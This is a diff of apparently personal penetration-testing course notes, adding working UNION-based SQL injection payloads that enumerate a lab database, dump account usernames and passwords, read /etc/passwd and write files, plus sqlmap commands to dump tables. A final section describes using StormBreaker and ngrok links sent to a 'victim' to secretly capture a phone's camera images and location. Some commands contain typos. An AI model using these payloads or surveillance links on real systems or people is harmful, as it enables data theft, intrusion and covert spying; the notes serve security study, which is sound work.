@@ -525,6 +525,8 @@ We start by adding a single quote to the password field:
 Name: username
 Password: '
 
+You should try this single quote in all of the fields to see if any of them are vulnerable to SQL injection.
+
 If the website returns an error then it's vulnerable to SQL injection. It does this because in the database it breaks the SQL command. Most modern websites will not reveal any error information but you can use a sleep command, for example, to see if the webpage hangs (freezes) 
 
 Simple SQL payload attacking the password field:
@@ -551,28 +553,112 @@ A table is a collection of rows having one or more columns. A row is a value of 
 
 I'll add a screenshot here of the table from the Metasploitable server, when i get on it, because it might be easier to see what is happening and what is meant by the different terminology. 
 
-Video at 2:36:02- I'll finish the course tomorrow. 
+Using union select instead of order
+```sh
+' union select 1,2,3,4,5 %23
+```
 
+We can use the results to modify the request and gain additional information
+```sh
+' union select 1,database(),user(),version(),5 %23
+```
+- %20 - URL encoded version of a space in the URL field
 
+Retrieving table names
+```sh
+' union select 1,table_name,null,null,5 from information_schema.tables
+```
 
+Retrieving a specific table
+```sh
+' union select 1,table_name,null,null,5 from information_schema.tables where table_schema = "owasp10"
+```
+- Using the result from the database command `database()` which in this case was owasp10.
 
+Select specific column names
+```sh
+' union select 1,column_name,null,null,5 from information_schema.columns where table_name = "accounts"
+```
 
+Retrieve the sensitive data 
+```sh
+' union select 1, username,password,is_admin,5 from accounts
+```
+- I've left the URL comment `%23` out of the last few payloads so make sure to leave it in the URL while going through these steps.
 
+How to read files
+```sh
+' union select null,load_file("/ect/passwd"),null,null,null
+```
 
+How to writes files
+```sh
+' union select null, "some text", null,null,null into outfile "/tmp/some-text-file.txt"
+```
+- Usually it doesn't allow you to write files but it's worth checking.
 
+---
 
+**SQLMap - Automatic SQL Injection Tool** 
 
+Start sqlmap by typing the name in a Kali terminal. or attack the site by providing it the URL:
+```sh
+sqlmap -u <"URL">
+```
+- You want to enter the full path to what you want it to attack, for example the login page.
 
+Get a list of commands
+```sh
+sqlmap --help
+```
 
+Run a scan for everything it can find
+```sh
+sqlmap -u <"URL"> -a
+```
+- This tool is covered, in depth, in other sections of this obsidian file.
 
+Retrieve databases
+```sh
+sqlmap -u <"URL"> --dbs
+```
 
+Retrieve tables using one of the database names found in the previous command
+```sh
+sqlmap -u <"URL"> --tables -D owasp10
+```
 
+View account table
+```sh
+sqlmap -u <"URL"> --colums -D owasp10 -t accounts
+```
 
+Dump the column information
+```sh
+sqlmap -u <"URL"> -D owasp10 -t accounts --dump
+```
 
+---
 
+**Mobile Penetration Testing - Accessing Location, Microphone, and Camera**
 
+Tools: StormBreaker https://github.com/ultrasecurity/Storm-Breaker
 
+Start stormbreaker after following the installation guide on github. I wont add the installation steps since they may change over time.
+```sh
+sudo python3 st.py
+```
 
+This tool requires ngrok to be installed which you can find online. Unfortunately, you have to make an account to authenticate. On the setup and installation tab it gives you a an authtoken for your config file. Now you can open the ngrok command that stormbreaker gives you in a new terminal tab.
 
+The login details for the admin panel for ngrok is: admin/admin
 
+The links that it provides are designed for you to send to the victim hoping they will use them and allow access to the ngrok app. 
 
+For example, if you sent the camera link, it will start to capture and the images will be stored in the stormbreaker folder `/opt/storm-breaker/storm-web/images` 
+
+Always store your 3rd party tools in `/opt`
+
+The location link, if clicked, gives you googlemaps that you can paste into the browser to show the phones location.
+
+**Completed:** _2025-04-02_
